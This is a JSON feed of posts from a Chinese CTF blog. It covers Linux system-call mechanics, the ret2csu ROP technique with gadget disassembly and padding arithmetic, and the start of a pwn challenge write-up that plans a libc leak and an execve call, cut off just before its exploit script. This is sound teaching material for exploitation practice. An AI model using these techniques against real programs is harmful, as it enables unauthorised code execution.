{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"ctf\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "url": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "title": "Linux之系统调用",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"一系统调用\"><a class=\"anchor\" href=\"#一系统调用\">#</a> 一。系统调用</h1>\n<h5 id=\"系统调用也是一个函数但是系统调用运行在内核态用户自定义的函数在用户态-而我们想要调用在内核态的指令如关闭打开中断io操作等就需要利用系统调用作为接口让用户进入内核态\"><a class=\"anchor\" href=\"#系统调用也是一个函数但是系统调用运行在内核态用户自定义的函数在用户态-而我们想要调用在内核态的指令如关闭打开中断io操作等就需要利用系统调用作为接口让用户进入内核态\">#</a> 系统调用也是一个函数，但是系统调用运行在内核态，用户自定义的函数在用户态。而我们想要调用在内核态的指令（如关闭 / 打开中断，I/O 操作等），就需要利用系统调用作为接口，让用户进入内核态。</h5>\n<h5 id=\"系统调用是linux内核提供的一段代码也可以理解为函数用来实现特定的功能32位程序x86-cpu利用-int-0x80-来进行系统调用64位程序x64-cpu提供调用syscall来进行系统调用-linux内核提供用户空间程序与内核空间进行交互的接口接口让用户态程序能受限访问硬件设备比如申请系统资源操作设备读写创建新进程等用户空间发起请求内核空间负责进行执行两者之间就需要接口作为桥梁用户可以通过这种方式来进行系统调用但是用户是受到限制的不能直接执行内核代码也不能随意进行修改系统必须通过特定方式才能进行才能进入内核也需要一定的权限才能使用接口\"><a class=\"anchor\" href=\"#系统调用是linux内核提供的一段代码也可以理解为函数用来实现特定的功能32位程序x86-cpu利用-int-0x80-来进行系统调用64位程序x64-cpu提供调用syscall来进行系统调用-linux内核提供用户空间程序与内核空间进行交互的接口接口让用户态程序能受限访问硬件设备比如申请系统资源操作设备读写创建新进程等用户空间发起请求内核空间负责进行执行两者之间就需要接口作为桥梁用户可以通过这种方式来进行系统调用但是用户是受到限制的不能直接执行内核代码也不能随意进行修改系统必须通过特定方式才能进行才能进入内核也需要一定的权限才能使用接口\">#</a> 系统调用是 Linux 内核提供的一段代码（也可以理解为函数）用来实现特定的功能，**32 位程序（x86 CPU）利用 int 0x80 ** 来进行系统调用，<strong>64 位程序 (X64 CPU) 提供调用 syscall</strong> 来进行系统调用。Linux 内核提供用户空间程序与内核空间进行交互的接口（接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等），用户空间发起请求，内核空间负责进行执行，两者之间就需要接口作为桥梁，用户可以通过这种方式来进行系统调用，但是用户是受到限制的，不能直接执行内核代码，也不能随意进行修改系统，必须通过特定方式才能进行才能进入内核，也需要一定的权限才能使用接口。</h5>\n<h5 id=\"上述提到的用户空间与内核空间之间的桥梁就是系统调用syscallsystem-call其作为中间层用来连接用户态和内核态这样做加强了一定的安全性并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可-当用户空间向系统空间发起系统调用时linux系统便会进行软中断进入内核态执行相应的操作\"><a class=\"anchor\" href=\"#上述提到的用户空间与内核空间之间的桥梁就是系统调用syscallsystem-call其作为中间层用来连接用户态和内核态这样做加强了一定的安全性并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可-当用户空间向系统空间发起系统调用时linux系统便会进行软中断进入内核态执行相应的操作\">#</a> 上述提到的用户空间与内核空间之间的桥梁就是系统调用 (syscall,system call), 其作为中间层用来连接用户态和内核态，这样做加强了一定的安全性，并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可。当用户空间向系统空间发起系统调用时，Linux 系统便会进行软中断，进入内核态执行相应的操作。</h5>\n<h5 id=\"不同的系统调用执行的命令有着不同的系统调用号32位程序与64位程序也不尽相同\"><a class=\"anchor\" href=\"#不同的系统调用执行的命令有着不同的系统调用号32位程序与64位程序也不尽相同\">#</a> 不同的系统调用执行的命令有着不同的系统调用号（32 位程序与 64 位程序也不尽相同）</h5>\n<h1 id=\"二32位程序系统调用\"><a class=\"anchor\" href=\"#二32位程序系统调用\">#</a> 二.<strong>32 位程序</strong>系统调用</h1>\n<h5 id=\"1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\"><a class=\"anchor\" href=\"#1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\">#</a> 1. 在 32 位系统（x86 CPU）中，Linux 通过了 int 0x80 中断来进入系统调用，</h5>\n<pre><code class=\"language-C\">void system_call()\n&#123;\n    ...\n    // 变量 eax 代表 eax 寄存器的值\n    syscall = sys_call_table[eax];\n    eax = syscall();\n    ...\n&#125;\n</code></pre>\n<p>sys_call_table 变量是一个数组（eax 寄存器的值作为其下标），数组的每一个元素代表着一个系统调用的入口（这让我想起了操作系统实验 x_x）, 其 C 代码如下</p>\n<pre><code class=\"language-C\">long sys_call_table[] = &#123;\n   sys_ni_syscall,\n   sys_exit,\n   sys_fork,\n   sys_read,\n   sys_write,\n   sys_open,\n   sys_close,\n   ...\n&#125;;\n</code></pre>\n<h5 id=\"用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\"><a class=\"anchor\" href=\"#用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\">#</a> 用户调用<strong>系统调用</strong>时，通过向 eax 寄存器写入对应命令的系统调用号，这个号就是 sys_call_table 数组的下标，system_call 过程获取 eax 寄存器的值，然后通过 eax 寄存器的值找到要调用的系统入口并调用，系统调用完成后会把<strong>返回值保存到 eax 寄存器中</strong></h5>\n<h5 id=\"用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\"><a class=\"anchor\" href=\"#用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\">#</a> 用户进行系统调用时，在 eax 寄存器写入对应的系统调用编号，而用户态和内核态使用的栈不同，系统调用是用户态调用然后进入系统调用后会转变成内核态，要经历用户态与内核态的转化，所以不能直接使用用户空间的栈来传递参数（32 位系统用户态内利用栈来传参，64 位仍然需要寄存器来传参）。Linux 使用寄存器来传递参数，其顺序如下：</h5>\n<ul>\n<li>第 1 个参数放置在 ebx  寄存器。</li>\n<li>第 2 个参数放置在 ecx  寄存器。</li>\n<li>第 3 个参数放置在 edx  寄存器。</li>\n<li>第 4 个参数放置在 esi   寄存器。</li>\n<li>第 5 个参数放置在 edi   寄存器。</li>\n<li>第 6 个参数放置在 ebp 寄存器。</li>\n</ul>\n<h5 id=\"linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\"><a class=\"anchor\" href=\"#linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\">#</a> Linux 进入中断处理时，就会将这些寄存器的值保存到内核栈中，这样系统调用就能通过内核栈来获取参数。</h5>\n<p>x86 架构系统调用漏洞利用参考: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjQ4NjgyLmh0bQ==\">https://bbs.kanxue.com/thread-248682.htm</span></p>\n<p>参考文章: <span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9jcklycg==\">Linux 下 syscall 系统调用原理及实现</span></p>\n<h1 id=\"三64位系统系统调用\"><a class=\"anchor\" href=\"#三64位系统系统调用\">#</a> 三.<strong>64 位系统</strong>系统调用</h1>\n<h5 id=\"164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\"><a class=\"anchor\" href=\"#164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\">#</a> 1.64 位（x64 架构）系统中，Linux 通过<strong> syscall 指令</strong>来进入系统调用，其他原理与 x86 架构相似，这里偷懒不再解释，不过 64 位系统与 32 位系统寄存器不同，这里传参的寄存器也不一样</h5>\n<h5 id=\"传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\"><a class=\"anchor\" href=\"#传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\">#</a> 传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入<strong> rdi、rsi、rdx 寄存器</strong>中：</h5>\n<ul>\n<li>第 1 个参数放置在 rdi  寄存器。</li>\n<li>第 2 个参数放置在 rsi  寄存器。</li>\n<li>第 3 个参数放置在 rdx  寄存器。</li>\n<li>第 4 个参数放置在 rcx  寄存器。</li>\n<li>第 5 个参数放置在 r8  寄存器。</li>\n<li>第 6 个参数放置在 r9  寄存器。</li>\n</ul>\n<h5 id=\"系统调用完成后把返回值保存到rax寄存器中\"><a class=\"anchor\" href=\"#系统调用完成后把返回值保存到rax寄存器中\">#</a> 系统调用完成后，把<strong>返回值保存到 rax 寄存器中</strong></h5>\n<h1 id=\"四32位系统与64位系统-对比系统调用不同\"><a class=\"anchor\" href=\"#四32位系统与64位系统-对比系统调用不同\">#</a> 四.32 位系统与 64 位系统 <strong>对比系统调用不同</strong></h1>\n<h3 id=\"1系统调用号不同\"><a class=\"anchor\" href=\"#1系统调用号不同\">#</a> 1. 系统调用号不同</h3>\n<h5 id=\"32位\"><a class=\"anchor\" href=\"#32位\">#</a> 32 位</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_32_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_32_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_restart_syscall 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_exit 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_fork 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_read 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_write 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_open 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_close 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_waitpid 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_creat 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_link 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_unlink 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_execve 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_chdir 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_time 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_mknod 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_chmod 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_lchown 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_break 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_oldstat 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_mount 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_umount 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_setuid 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_getuid 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_stime 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_ptrace 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_oldfstat 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_pause 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_utime 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_stty 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_gtty 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_access 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_nice 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_ftime 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_sync 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_kill 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_rename 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_mkdir 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_rmdir 40</span></pre></td></tr></table></figure><h5 id=\"64位系统\"><a class=\"anchor\" href=\"#64位系统\">#</a> 64 位系统</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_64_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_64_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_read 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_write 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_open 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_close 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_stat 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_fstat 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_lstat 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_poll 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_mmap 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_mprotect 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_munmap 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_brk 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigaction 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigprocmask 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigreturn 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_ioctl 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_pread64 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_pwrite64 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_readv 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_writev 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_access 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_pipe 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_select 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_sched_yield 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_mremap 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_msync 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_mincore 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_madvise 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_shmget 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_shmat 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_shmctl 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_dup 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_dup2 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_pause 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_nanosleep 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_getitimer 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_setitimer 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_sendfile 40</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#define __NR_socket 41</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#define __NR_connect 42</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#define __NR_accept 43</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#define __NR_sendto 44</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\">#define __NR_recvfrom 45</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">#define __NR_sendmsg 46</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#define __NR_recvmsg 47</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">#define __NR_shutdown 48</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#define __NR_bind 49</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#define __NR_listen 50</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#define __NR_getsockname 51</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#define __NR_getpeername 52</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\">#define __NR_socketpair 53</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#define __NR_setsockopt 54</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#define __NR_getsockopt 55</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#define __NR_clone 56</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#define __NR_fork 57</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">#define __NR_vfork 58</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#define __NR_execve 59</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">#define __NR_exit 60</span></pre></td></tr></table></figure><p>完整系统调用号:<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9kcnN5eQ==\">http://t.csdn.cn/drsyy</span></p>\n<h3 id=\"2寄存器传参不同上面已经说明过了\"><a class=\"anchor\" href=\"#2寄存器传参不同上面已经说明过了\">#</a> 2. 寄存器传参不同 (上面已经说明过了)</h3>\n<h3 id=\"3进行系统调用方式不同\"><a class=\"anchor\" href=\"#3进行系统调用方式不同\">#</a> 3. 进行系统调用方式不同</h3>\n<p>32 位系统通过 ** int 0x80 ** 中断进入系统调用</p>\n<p>64 位系统通过 ** syscall ** 命令进入系统调用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9KejZIbQ==\">http://t.csdn.cn/Jz6Hm</span></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/",
            "title": "64位构造通用ROP，ret2csu",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<h1 id=\"ret2csu\"><a class=\"anchor\" href=\"#ret2csu\">#</a> ret2csu</h1>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h2>\n<ul>\n<li>64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadges。这时候，我们可以利用 x64 下的__libc_csu_init 中的 gadgets。</li>\n<li>这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</li>\n</ul>\n<h4 id=\"下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\"><a class=\"anchor\" href=\"#下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\">#</a> 下面借用别人在 IDA 摘出来的__libc_csu_init 函数的汇编指令</h4>\n<pre><code>.text:00000000004011B0 ; void _libc_csu_init(void)\n.text:00000000004011B0                 public __libc_csu_init\n.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o\n.text:00000000004011B0 ; __unwind &#123;\n.text:00000000004011B0                 push    r15\n.text:00000000004011B2                 mov     r15, rdx\n.text:00000000004011B5                 push    r14\n.text:00000000004011B7                 mov     r14, rsi\n.text:00000000004011BA                 push    r13\n.text:00000000004011BC                 mov     r13d, edi\n.text:00000000004011BF                 push    r12\n.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry\n.text:00000000004011C8                 push    rbp\n.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004011D0                 push    rbx\n.text:00000000004011D1                 sub     rbp, r12\n.text:00000000004011D4                 sub     rsp, 8\n.text:00000000004011D8                 call    _init_proc\n.text:00000000004011DD                 sar     rbp, 3\n.text:00000000004011E1                 jz      short loc_4011FE\n.text:00000000004011E3                 xor     ebx, ebx\n.text:00000000004011E5                 nop     dword ptr [rax]\n.text:00000000004011E8\n</code></pre>\n<p>gadgets2:</p>\n<pre><code>.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j\n.text:00000000004011E8                 mov     rdx, r15\n.text:00000000004011EB                 mov     rsi, r14\n.text:00000000004011EE                 mov     edi, r13d\n.text:00000000004011F1                 call    qword ptr [r12+rbx*8]\n.text:00000000004011F5                 add     rbx, 1\n.text:00000000004011F9                 cmp     rbp, rbx\n.text:00000000004011FC                 jnz     short loc_4011E8\n.text:00000000004011FE\n</code></pre>\n<p>gadgets1:</p>\n<pre><code>.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j\n.text:00000000004011FE                 add     rsp, 8\n.text:0000000000401202                 pop     rbx\n.text:0000000000401203                 pop     rbp\n.text:0000000000401204                 pop     r12\n.text:0000000000401206                 pop     r13\n.text:0000000000401208                 pop     r14\n.text:000000000040120A                 pop     r15\n.text:000000000040120C                 retn\n.text:000000000040120C ; &#125; // starts at 4011B0\n.text:000000000040120C __libc_csu_init endp\n</code></pre>\n<p>这里搬运之前在 CSDN 上发的文章（汇编代码执行顺序为先 gadgets2, 然后 gadgets1）</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8abb18a591a445808abc86226a99d2c9.png\" alt=\"\" /></p>\n<p>pop 命令 会把栈中的值存入相应的寄存器中，那么我们可以通过往栈中写对应的数据来存入寄存器里</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8400e847c08a419ba7c04f174dc26712.png\" alt=\"\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cmp</span>     rbx, rbp   //cpm后的不同的调整指令有着不同的作用，这里 jnz 比较结果相同不跳转，不相同就跳转</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>jnz     short loc_400580</pre></td></tr></table></figure><p>最后第二次回到 gadget1 时，此时已经给寄存器赋值完毕只需要回到 ret，此处填充 56 个 padding 字符是因为在地址 0x4011FE 处有   <code>add rsp , 8 </code>  这会把 rsp 栈提高 8，所以要填充 8 个字符来站这个位置，后面的  <code>pop rbx ~ pop r15</code>  共有 6 个寄存器，pop 了 6 次，所以总共是 （6+1）*8=56，所以填充 56 个字符即可到 ret 来控制程序执行</p>\n<p>例题:<a href=\"https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/\" title=\"ret2csu\">https://vvwwvv.cn/2023/05/04/pwn/ 刷题 / 看雪社区 / 看雪社区 pwn8 (64 位构造通用 ROP,ret2csu)/</a></p>\n",
            "tags": [
                "pwn",
                "ret2csu"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/",
            "title": "看雪社区pwn8（64位构造通用ROP，ret2csu）",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<h3 id=\"查看程序\"><a class=\"anchor\" href=\"#查看程序\">#</a> 查看程序</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/1ed670b5ceeb462994b707ec5fcfcfef.png\" alt=\"\" /></p>\n<h3 id=\"64位程序开启了nx\"><a class=\"anchor\" href=\"#64位程序开启了nx\">#</a> 64 位程序，开启了 NX</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/9c917aba36be440a838d8ac8b70a0c2d.png\" alt=\"\" /></p>\n<p>有溢出漏洞， <strong>变量为 char 型变量</strong></p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/72ef02703ac246488cecade776d65acd.png\" alt=\"\" /></p>\n<p>没有后门函数， 那就 &lt;font color=red&gt; 去 libc 中找 execve 地址执行 &lt;/font&gt;</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/d4fe1b33d8224911a9d218d861317b60.png\" alt=\"\" /></p>\n<p>偏移量为 136</p>\n<pre><code>write：write(1，输出地址，输出字节数)      \n             write(1,write_got,8)                \nread：read(0,写入地址，写入字节数)\n             read(0,bss_base,16)\n</code></pre>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption 